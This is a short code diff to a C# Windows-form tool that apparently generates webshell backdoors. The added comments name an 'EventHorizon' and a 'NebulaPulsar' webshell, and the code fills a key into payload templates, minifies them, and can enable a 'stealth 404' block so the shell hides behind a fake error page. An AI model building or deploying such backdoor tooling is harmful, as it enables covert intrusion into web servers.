@@ -26,6 +26,11 @@ namespace Alien
             m_tamper = tamper;
         }
 
+        /// <summary>
+        /// Update EventHorizon webshell backdoor.
+        /// </summary>
+        /// <param name="bShowError"></param>
+        /// <returns></returns>
         async Task fnUpdateTamperPayload(bool bShowError = true)
         {
             string szScriptName = comboBox1.Text;
@@ -60,15 +65,20 @@ namespace Alien
             }
         }
 
+        /// <summary>
+        /// Display NebulaPulsar webshell backdoor in text editor.
+        /// </summary>
         void fnUpdateNbPayload()
         {
             try
             {
                 textEditorControl3.Text = File.ReadAllText(m_lsNbPayload[comboBox3.SelectedIndex]).Replace("[NBPULSARDEADBEEF]", clsCrypto.fnGetMD5Last16(textBox4.Text));
 
+                // Remove CL/CR
                 if (checkBox1.Checked)
                     textEditorControl3.Text = textEditorControl3.Text.Replace("\r", string.Empty).Replace("\n", string.Empty).Replace("\t", string.Empty).Replace("  ", string.Empty);
 
+                // 404
                 if (checkBox2.Checked)
                     textEditorControl3.Text = textEditorControl3.Text.Replace("/* [STEALTH_404_START]", string.Empty).Replace("[STEALTH_404_END] */", string.Empty);
 
